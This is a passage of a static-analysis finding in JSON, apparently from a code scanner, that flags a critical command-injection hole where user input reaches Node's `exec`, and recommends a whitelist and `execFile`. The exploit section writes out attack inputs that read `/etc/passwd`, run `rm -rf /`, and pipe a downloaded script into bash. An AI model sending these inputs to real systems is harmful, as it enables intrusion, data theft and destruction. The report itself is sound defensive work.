          "ruleId": "javascript_lang_dynamic_os_command",
          "level": "error",
          "message": {
            "text": "[CRITICAL] The application directly takes the value of `req.query.cmd` from user input and passes it to the `exec` function, which executes operating system commands. This is a severe command injection vulnerability. An attacker can inject arbitrary shell commands by appending them to the `cmd` parameter using shell metacharacters (e.g., `&`, `|`, `&&`, `||`, `;`). This allows them to execute any command on the server, potentially leading to remote code execution, data exfiltration, system compromise, or denial-of-service.\n\nExploit: An attacker could send a GET request like:\n`GET /run?cmd=ls -la /`\nThis would list the contents of the root directory of the server. More maliciously, an attacker could try:\n`GET /run?cmd=cat /etc/passwd`\nThis would print the contents of the password file on a Linux system, exposing sensitive user information. Arbitrary commands like `rm -rf /` (if permissions allow) or `wget malicious_script.sh | bash` could also be executed.\n\nFix: Arbitrary execution of user-supplied commands should be avoided. If specific command execution is absolutely necessary, a strict whitelist approach should be used, where only pre-defined, safe commands are allowed. User input should never be directly concatenated into command strings. For executing a specific program with arguments, prefer `child_process.execFile` over `exec`, as `execFile` directly executes the command without spawning a shell, reducing the risk of shell metacharacter injection. Arguments passed to `execFile` are treated as separate arguments, not part of a shell command string."
          },
